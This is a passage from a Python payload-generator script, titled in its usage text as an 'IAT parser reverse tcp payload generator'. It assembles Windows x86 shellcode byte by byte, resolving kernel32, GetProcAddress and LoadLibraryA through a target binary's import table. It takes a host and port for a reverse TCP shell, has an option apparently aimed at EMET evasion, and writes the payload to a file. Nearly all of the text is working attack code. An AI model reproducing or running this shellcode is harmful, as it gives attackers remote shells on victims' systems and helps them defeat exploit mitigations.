    shellcode3 = ("\x8b\x5a\x10"                 # 0000002D  8B5A10            mov ebx,[edx+0x10]
                 "\x8b\x12"                     # 00000030  8B12              mov edx,[edx]
                 "\x75\xdb"                     # 00000032  75DB              jnz 0xf
                 # iatparser
                 "\x90"                         # 00000034  90                nop
                 "\x90"                         # 00000035  90                nop
                 "\x90"                         # 00000036  90                nop
                 "\x89\xda"                     # 00000037  89DA              mov edx,ebx
                 "\x03\x52\x3c"                 # 00000039  03523C            add edx,[edx+0x3c]
                 "\x8b\xba\x80\x00\x00\x00"     # 0000003C  8BBA80000000      mov edi,[edx+0x80]
                 "\x01\xdf"                     # 00000042  01DF              add edi,ebx
                 # findImport
                 "\x90"                         # 00000044  90                nop
                 "\x90"                         # 00000045  90                nop
                 "\x8b\x57\x0c"                 # 00000046  8B570C            mov edx,[edi+0xc]
                 "\x01\xda"                     # 00000049  01DA              add edx,ebx
                 "\x81\x3a\x4b\x45\x52\x4e"     # 0000004B  813A4B45524E      cmp dword [edx],0x4e52454b
                 "\x81\x7a\x04\x45\x4c\x33\x32"  # 00000051  817A04454C3332    cmp dword [edx+0x4],0x32334c45
                 "\x74\x05"                     # 00000058  7405              jz 0x5f
                 "\x83\xc7\x14"                 # 0000005A  83C714            add edi,byte +0x14
                 "\xeb\xe5"                     # 0000005D  EBE5              jmp short 0x44
                 # saveBase
                 "\x57"                         # 0000005F  57                push edi
                 "\xeb\x3d"                     # 00000060  EB3D              jmp short 0x9f
                 # setbounds
                 "\x90"                         # 00000062  90                nop
                 "\x90"                         # 00000063  90                nop
                 "\x8b\x57\x10"                 # 00000064  8B5710            mov edx,[edi+0x10]
                 "\x01\xda"                     # 00000067  01DA              add edx,ebx
                 "\x8b\x37"                     # 00000069  8B37              mov esi,[edi]
                 "\x01\xde"                     # 0000006B  01DE              add esi,ebx
                 "\x89\xd1"                     # 0000006D  89D1              mov ecx,edx
                 # this can be set based on the size of the .data section of the exploted binary or
                 # for the exploited DLL ... 0xff0000 for now.
                 #"\x81\xc1\x00\x00\x04\x00"      # add ecx, 0x40000                      ;Set an upper bounds for reading
                    
                 "\x81\xc1\x00\x00\xff\x00"     # 0000006F  81C10000FF00      add ecx,0xff0000
                 
                 "\x31\xed"                     # 00000075  31ED              xor ebp,ebp
                 # findApi
                 "\x90"                         # 00000077  90                nop
                 "\x90"                         # 00000078  90                nop
                 "\x8b\x06"                     # 00000079  8B06              mov eax,[esi]
                 "\x01\xd8"                     # 0000007B  01D8              add eax,ebx
                 "\x83\xc0\x02"                 # 0000007D  83C002            add eax,byte +0x2
                 "\x39\xc1"                     # 00000080  39C1              cmp ecx,eax
                 "\x72\x13"                     # 00000082  7213              jc 0x97
                 "\x8b\x7c\x24\x04"             # 00000084  8B7C2404          mov edi,[esp+0x4]
                 "\x39\x38"                     # 00000088  3938              cmp [eax],edi
                 "\x75\x0b"                     # 0000008A  750B              jnz 0x97
                 "\x3e\x8b\x7c\x24\x08"         # 0000008C  3E8B7C2408        mov edi,[ds:esp+0x8]
                 "\x39\x78\x08"                 # 00000091  397808            cmp [eax+0x8],edi
                 "\x75\x01"                     # 00000094  7501              jnz 0x97
                 "\xc3"                         # 00000096  C3                ret
                 # Increment
                 "\x83\xc5\x04"                 # 00000097  83C504            add ebp,byte +0x4
                 "\x83\xc6\x04"                 # 0000009A  83C604            add esi,byte +0x4
                 "\xeb\xd8"                     # 0000009D  EBD8              jmp short 0x77
                 # loadApis
                 "\x90"                         # 0000009F  90                nop
                 "\x90"                         # 000000A0  90                nop
                 "\x68\x64\x64\x72\x65"          # push 0x65726464                       ;ddre
                 "\x68\x47\x65\x74\x50"          # push 0x50746547                       ;Getp
                 "\xe8\xb3\xff\xff\xff"          # call 0x1032                           ;call setBounds
                 "\x03\xd5"                      # add edx, ebp                          ;
                 "\x5d"                          # pop ebp                               ;
                 "\x5d"                          # pop ebp                               ;
                 "\x8b\xca"                      # mov ecx, edx                          ;Move GetProcaddress thunk addr into ecx
                 )
            #GPA in ECX
    shellcode3 += "\x89\xCD" # mov ebp, ecx
    #shellcode1 += "\x90\x90\xFC\x31\xD2\x64\x8B\x52\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x6A\x18\x59\x31\xFF\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B\x12\x75\xDB"
    shellcode3 += ("\x31\xd2"                          # xor    edx,edx
                  "\x64\x8b\x52\x30"                  # mov    edx,DWORD PTR fs:[edx+0x30]
                  "\x8b\x52\x0c"                      # mov    edx,DWORD PTR [edx+0xc]
                  "\x8b\x52\x14"                      # mov    edx,DWORD PTR [edx+0x14]
                  "\x8b\x72\x28"                      # mov    esi,DWORD PTR [edx+0x28]
                  "\x6a\x18"                          # push   0x18
                  "\x59"                              # pop    ecx
                  "\x31\xff"                          # xor    edi,edi
                  "\x31\xc0"                          # xor    eax,eax
                  "\xac"                              # lods   al,BYTE PTR ds:[esi]
                  "\x3c\x61"                          # cmp    al,0x61
                  "\x7c\x02"                          # jl     0x20
                  "\x2c\x20"                          # sub    al,0x20
                  "\xc1\xcf\x0d"                      # ror    edi,0xd
                  "\x01\xc7"                          # add    edi,eax
                  "\xe2\xf0"                          # loop   0x17
                  "\x81\xff\x5b\xbc\x4a\x6a"          # cmp    edi,0x6a4abc5b
                  "\x8b\x5a\x10"                      # mov    ebx,DWORD PTR [edx+0x10]
                  "\x8b\x12"                          # mov    edx,DWORD PTR [edx]
                  "\x75\xdb"                          # jne    0xf
                  )

    # kernel32.dll in ebx
    shellcode3 += ("\x6A\x00"                 # push 0
                   "\x68\x61\x72\x79\x41"     # push LoadLibraryA\x00
                   "\x68\x4c\x69\x62\x72"
                   "\x68\x4c\x6f\x61\x64" 
                   "\x54"                     # push esp
                   "\x53"                     # push ebx (kernerl32.dll handle)
                   "\x89\xE9"                 # mov ecx,ebp getprocaddr
                   "\xFF\x11"                 # call dword ptr [ecx]  # call dword ptr [ecx] 
                   "\x50"                     # push eax ; LLA in EAX
                   "\x89\xe3"                 # mov ebx, esp ; mov ptr to LLA in ebx
                   "\x87\xcd"                 # xchng ebx, esi
                   )
    # LOADLIBA in EBX
    # GETPROCADDR in ECX

    return shellcode1 + shellcode2 + shellcode3


if __name__ == "__main__":
    shellcode = ''
    if len(sys.argv) != 7:
        print "IAT parser reverse tcp payload generator"
        print '\xe0\xb2\xa0_\xe0\xb2\xa0'
        print "Usage:", sys.argv[0], "PE_BINARY", "HOST", "PORT", 'Operating_System_(winXP, winVista, win7, win8, win10)', 'Force_EMET_HASH_(True/False)', 'Force_Loaded_module_(True/False)'
        sys.exit(-1)


    dlls, lla_gpa_found, gpa_found = check_apis(sys.argv[1], sys.argv[4])
    
    print "[*] DLLs in the import table:", dlls
    
    shellcode = decision_tree(sys.argv[2], int(sys.argv[3]), dlls, lla_gpa_found, gpa_found, sys.argv[4], sys.argv[5], sys.argv[6])

    print "[*] Payload length:", len(shellcode)

    print "\"\\x" + "\\x".join("{:02x}".format(ord(c)) for c in shellcode) + "\""
    print "Writing payload to shellcode_output.bin"
    with open('shellcode_output.bin', 'w') as f:
        f.write(shellcode)
